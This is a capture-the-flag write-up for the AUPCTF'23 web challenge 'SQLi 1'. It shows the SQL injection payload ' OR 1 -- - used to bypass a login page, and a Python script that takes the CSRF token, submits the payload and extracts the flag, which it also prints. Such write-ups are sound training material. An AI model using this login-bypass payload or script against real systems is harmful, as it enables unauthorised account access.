---
title: AUPCTF'23 - Web - SQLi 1
date: '2023-06-25'
tags: ['ctf', 'web', 'aupctf', 'sqli', 'login-bypass']
draft: false
summary: Basic SQL Injection to bypass login
---

## Solution

We're given the following URL to work with:

```js
https://challs.aupctf.live/sqli-1/
```

Upon visiting the URL, we're greeted with a login page:

![Login Page](/static/writeups/aupctf/web/sqli1.png)

Now, since we already know that the challenge is of `SQLi`, we can try random payloads, the most common one I use in `beginner-friendly ctfs` is:

```sql
' OR 1 -- -
```

And, it works!

![Login Page](/static/writeups/aupctf/web/sqli1_flag.png)

As you might've already guessed by know how much I love `python`, I wrote a script to automate this. Similar to [Conundrum](/blog/writeups/aupctf/web/conundrum/), we need to send the data to the login page and we have a `csrfmiddlewaretoken`, so we will use the same script, but change the username password to the payload:

```py
import requests
import re

url = "https://challs.aupctf.live/sqli-1/"

sess = requests.Session()

username = "' OR 1 -- -"
password = "' OR 1 -- -"

print("[*] Extracting the CSRF Token", end='')
sess.get(url)
csrftoken = sess.cookies.get('csrftoken')
print(f" : {csrftoken}")

r = sess.post(
	url,
	headers = {
		'Referer' : url
	},
	data = {
		'csrfmiddlewaretoken' : csrftoken,
		'username' : username,
		'password' : password
	}
)
flag = re.findall("<h2>(.*?)</h2>", r.text)[0]
print(f"Flag: {flag}")
```

And, we get the flag:
Flag: `aupCTF{3a5y-sql-1nj3cti0n}`